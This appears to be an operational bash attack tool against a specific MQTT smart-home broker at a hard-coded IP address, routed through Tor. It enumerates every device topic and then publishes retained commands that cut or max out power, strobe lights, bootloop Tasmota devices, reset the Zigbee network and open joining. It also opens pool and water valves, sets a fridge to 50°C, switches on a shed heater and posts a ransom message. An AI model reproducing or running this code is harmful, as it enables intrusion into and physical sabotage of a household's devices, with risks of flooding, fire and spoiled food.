#!/bin/bash
# CHAOS v6.1 - TRUSTEDF57 TOTAL HOME ANNIHILATOR - FIXED
set -euo pipefail

# TARGET SYSTEM
HOST="82.22.173.161"
PORT="1883"
TOR="torsocks"

MAX_TEMP="50"
MAX_HUMID="99"
MAX_BRIGHT="255"
CHAOS_STATUS="TRUSTEDF57-TOTAL-ANNIHILATION"
RANSOM_MSG="💀 TRUSTEDF57 TOTAL HOME TAKEOVER 💀"

encrypt_payload() {
    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-I-FUCKED-MARTHA-ROOT" 2>/dev/null | sed 's/=//g'
}

tor_pub() {
    local topic=$1 payload=$2 qos=2
    [[ $# -eq 3 ]] && qos=$3
    ${TOR} mosquitto_pub -h "${HOST}" -p "${PORT}" -r -q "$qos" -t "$topic" -m "$payload" >/dev/null 2>&1
}

discover_all() {
    echo "[🔍] FULL DISCOVERY ${HOST}:${PORT} (45s)..."
    rm -f "chaos_all.txt"
    
    ${TOR} mosquitto_sub -h "${HOST}" -p "${PORT}" -t "#" -v | \
    timeout 45 head -n 5000 | \
    awk '{
        topic = $1
        if (topic ~ /Tasmota|wled|zigbee2mqtt|temp|humid|Garage|Garden|Shed|Pool|Fridge/i) {
            gsub(/^.*\//, "", topic)
            gsub(/\/.*$/, "", topic)
            if (topic != "" && length(topic) > 1 && length(topic) < 50) print topic
        }
    }' | sort -u > "chaos_all.txt"
    
    if [[ -f "chaos_all.txt" ]]; then
        COUNT=$(grep -c . "chaos_all.txt" 2>/dev/null || echo "0")
        echo "📋 TOTAL DEVICES: ${COUNT}"
        [[ $COUNT -gt 0 ]] && echo "[DEBUG] First 5:" && head -5 "chaos_all.txt"
    else
        COUNT="0"
        touch "chaos_all.txt"
    fi
    
    load_all
    echo "[✅] ${#ALL_DEVICES[@]} devices ready"
}

load_all() {
    ALL_DEVICES=()
    [[ -f "chaos_all.txt" && -s "chaos_all.txt" ]] && mapfile -t ALL_DEVICES < "chaos_all.txt"
}

show_menu() {
    clear
    COUNT=${#ALL_DEVICES[@]}
    cat << EOF
┌─ TRUSTEDF57 - ${HOST}:${PORT} (${COUNT} DEVICES) ─┐
│ 1)  FULL DISCOVERY (45s)                        │
│ 2)  🌡️ TEMP 50°C + 💧 99% SENSORS               │
│ 3)  💡 STROBE + MAX LIGHTS                      │
│ 4)  🔴 ALL POWER OFF                            │
│ 5)  🟢 ALL POWER ON + 255                       │
│ 6)  🎪 RAINBOW DISCO WLED                       │
│ 7)  💥 BOOTLOOP + ZIGBEE FLOOD                  │
│ 8)  🔒 BROKER RANSOM                            │
│ 9)  🏠 POOL/VALVES/FRIDGE                       │
│ 0)  🎯 TOTAL ANNIHILATION v6.1                  │
│ D)  📋 SHOW DEVICES                             │
│ X)  ❌ EXIT                                     │
└─────────────────────────────────────────────────┘
EOF
}

check_loaded() {
    [[ ${#ALL_DEVICES[@]} -eq 0 ]] && { 
        echo "❌ Run 1) DISCOVERY first"
        sleep 2
        return 1
    }
    return 0
}

show_devices() {
    [[ ${#ALL_DEVICES[@]} -eq 0 ]] && { echo "❌ No devices"; return 1; }
    echo "📋 DEVICES (${#ALL_DEVICES[@]}):"
    printf '%s\n' "${ALL_DEVICES[@]}" | head -20
    echo "... (first 20)"
}

max_temp_humidity() {
    check_loaded || return 1
    echo "[🌡️💧] MAX TEMP/HUMIDITY..."
    
    tor_pub "zigbee2mqtt/bridge/request/devices"
    tor_pub "zigbee2mqtt/#" '{"temperature": 50, "humidity": 99}'
    
    for dev in "${ALL_DEVICES[@]}"; do
        tor_pub "zigbee2mqtt/${dev}/set" '{"temperature": 50, "humidity": 99}'
        tor_pub "zigbee2mqtt/${dev}" '{"temperature": 50, "humidity": 99, "status": "CHAOS"}'
    done
    
    tor_pub "climate/#" '{"temperature": 50, "humidity": 99}'
    tor_pub "sensor/Fridge/state" "50.0°C 99%"
    echo "✅ SENSORS MAXED"
}

lights_strobe_max() {
    check_loaded || return 1
    echo "[💡] LIGHTS STROBE MAX..."
    count=0
    for dev in "${ALL_DEVICES[@]}"; do
        [[ $dev == Tasmota* || $dev == wled* || $dev == *light* ]] || continue
        tor_pub "${dev}/cmnd/Power" "1"
        tor_pub "${dev}/cmnd/Bri" "255"
        tor_pub "${dev}/POWER" "TOGGLE"
        ((count++))
    done
    echo "✅ ${count} LIGHTS"
}

power_off_all() {
    check_loaded || return 1
    echo "[🔴] POWER OFF..."
    for dev in "${ALL_DEVICES[@]}"; do
        tor_pub "${dev}/cmnd/Power" "0"
        tor_pub "${dev}/POWER" "OFF"
        tor_pub "${dev}/set" '{"state": "OFF"}'
    done
    echo "✅ OFF"
}

power_max_all() {
    check_loaded || return 1
    echo "[🟢] POWER ON MAX..."
    for dev in "${ALL_DEVICES[@]}"; do
        tor_pub "${dev}/cmnd/Power" "1"
        tor_pub "${dev}/POWER" "ON"
        tor_pub "${dev}/cmnd/Bri" "255"
        tor_pub "${dev}/set" '{"state": "ON", "brightness": 255}'
    done
    echo "✅ MAX"
}

disco_chaos() {
    check_loaded || return 1
    echo "[🎪] DISCO..."
    disco_fx="fx 38;sx 255;ix 255;bri 255;col 255,0,255"
    count=0
    for dev in "${ALL_DEVICES[@]}"; do
        [[ $dev == wled* ]] || continue
        tor_pub "wled/${dev}/backlog" "${disco_fx}"
        ((count++))
    done
    echo "✅ ${count} DISCO"
}

bootloop_flood() {
    check_loaded || return 1
    echo "[💥] BOOTLOOP..."
    bootloop="Power1;Delay 400;Power0;Delay 200;Power1;Delay 800;LOOP"
    count=0
    for dev in "${ALL_DEVICES[@]}"; do
        [[ $dev == Tasmota* ]] || continue
        tor_pub "Tasmota/${dev}/cmnd/Backlog" "${bootloop}"
        ((count++))
    done
    tor_pub "zigbee2mqtt/bridge/request/network/reset" '{"force": true}'
    tor_pub "zigbee2mqtt/bridge/request/lan/action" '{"action": "permit_join", "duration": 65535}'
    echo "✅ ${count} BOOTLOOP"
}

broker_ransom() {
    echo "[🔒] RANSOM..."
    ransom_data="{\"status\":\"${CHAOS_STATUS}\",\"temp\":${MAX_TEMP},\"humid\":${MAX_HUMID},\"brightness\":${MAX_BRIGHT}}"
    crypt_data=$(encrypt_payload "${ransom_data}")
    
    tor_pub "\$SYS/brokers/${HOST}/sysdescr" "${RANSOM_MSG}"
    tor_pub "\$SYS/brokers/${HOST}/version" "${crypt_data}"
    tor_pub "zigbee2mqtt/bridge/state" "${crypt_data}"
    tor_pub "homeassistant/status" "TRUSTEDF57"
    echo "✅ RANSOM"
}

valves_pool_chaos() {
    check_loaded || return 1
    echo "[🏠] POOL/VALVES..."
    tor_pub "zigbee2mqtt/Pool Valve/set" '{"state": "ON"}'
    tor_pub "zigbee2mqtt/Water Valve/set" '{"state": "ON"}'
    tor_pub "zigbee2mqtt/Fridge/set" '{"temperature": 50}'
    tor_pub "Pool - 0xa4c13801669cffff/set" '{"state": "ON"}'
    tor_pub "Tasmota/Garage_Lights_1/cmnd/Power" "1"
    tor_pub "Tasmota/shed-heater/cmnd/Power" "1"
    echo "✅ VALVES"
}

total_annihilation_v61() {
    check_loaded || return 1
    echo "🎯 TOTAL ANNIHILATION..."
    power_off_all; sleep 1
    max_temp_humidity; sleep 2
    power_max_all; sleep 2
    lights_strobe_max; sleep 2
    disco_chaos; sleep 2
    bootloop_flood; sleep 2
    broker_ransom; sleep 2
    valves_pool_chaos
    echo "💀🏠 COMPLETE 💀"
}

# MAIN
ALL_DEVICES=()
clear
echo "💀 TRUSTEDF57 CHAOS v6.1 - ${HOST}:${PORT}"

while true; do
    show_menu
    read -r -t 30 choice || choice=""
    case "${choice}" in
        1) discover_all ;;
        2) max_temp_humidity ;;
        3) lights_strobe_max ;;
        4) power_off_all ;;
        5) power_max_all ;;
        6) disco_chaos ;;
        7) bootloop_flood ;;
        8) broker_ransom ;;
        9) valves_pool_chaos ;;
        0) total_annihilation_v61 ;;
        [Dd]) show_devices ;;
        [Xx]|[Qq]) echo "EXIT"; exit 0 ;;
        *) echo "❌ ${choice} - 1=DISCOVERY D=DEVICES" ;;
    esac
    echo
    read -p "ENTER to continue... (X=exit)" || true
done
